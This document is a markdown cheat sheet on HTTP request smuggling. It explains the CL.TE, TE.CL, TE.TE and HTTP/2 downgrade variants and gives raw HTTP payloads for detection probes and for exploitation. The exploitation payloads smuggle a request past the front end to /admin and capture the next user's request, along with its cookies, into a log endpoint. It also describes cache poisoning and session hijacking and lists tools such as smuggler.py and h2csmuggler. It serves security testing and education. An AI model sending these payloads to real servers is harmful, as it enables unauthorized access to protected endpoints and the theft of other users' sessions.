# HTTP Request Smuggling

## Concept

When a front-end (proxy/LB) and back-end server disagree on where
one HTTP request ends and the next begins, an attacker can "smuggle"
a request that the front-end sees as part of one request but the
back-end interprets as a separate request.

## Variants

### CL.TE (Content-Length vs Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end forwards 13 bytes (including `0\r\n\r\nSMUGGLED`).
The back-end sees the chunked `0` terminator and treats `SMUGGLED`
as the start of the next request.

### TE.CL (Transfer-Encoding vs Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The front-end processes chunks (`8\r\nSMUGGLED\r\n0\r\n`).
The back-end reads only 3 bytes per Content-Length, leaving
`SMUGGLED\r\n0\r\n\r\n` as a new request.

### TE.TE (Transfer-Encoding obfuscation)

Both servers support TE, but one can be induced to ignore it
via header obfuscation:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-encoding: cow
```

### H2.CL / H2.TE (HTTP/2 downgrade)

**When**: Front-end speaks HTTP/2, back-end speaks HTTP/1.1.

HTTP/2 has its own framing (no CL/TE ambiguity), but when the
front-end translates to HTTP/1.1 for the back-end, it may
introduce CL/TE headers that enable smuggling.

## Detection

```http
# CL.TE probe: if back-end hangs, it's processing chunked
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

# TE.CL probe: if back-end hangs, it's using Content-Length
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

## Exploitation

### Bypass Front-End Security

```http
# Smuggle a request to /admin that the front-end would block
POST / HTTP/1.1
Host: target.com
Content-Length: 53
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

### Capture Other Users' Requests

```http
# Smuggle a request that starts a POST to an endpoint you control
# The next legitimate user's request becomes the POST body
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

data=
```

### Web Cache Poisoning

Smuggle a request that causes the cache to store a malicious
response under a legitimate URL.

### Session Hijacking

Smuggle a request with the victim's cookies (captured via the
request capture technique above).

## Burp Suite

```
# HTTP Request Smuggler extension
# Automatically probes for CL.TE, TE.CL, TE.TE
# Generates smuggling payloads

# Manual: Repeater → uncheck "Update Content-Length"
```

## Browser-Powered Desync (2022+)

Use JavaScript `fetch()` with specific configurations to trigger
desync in the victim's browser connection to the target server.
The browser sends a CL-based request while the server expects TE.

## Microservice Desync (2025+)

In modern cloud architectures (CDN → LB → WAF → ingress → sidecar → app),
each layer may parse headers differently. Even header name casing
or trailing whitespace can create a desync between layers.

## Tools

```bash
smuggler.py -u https://target.com       # automated detection
h2csmuggler                              # HTTP/2 downgrade smuggling
```
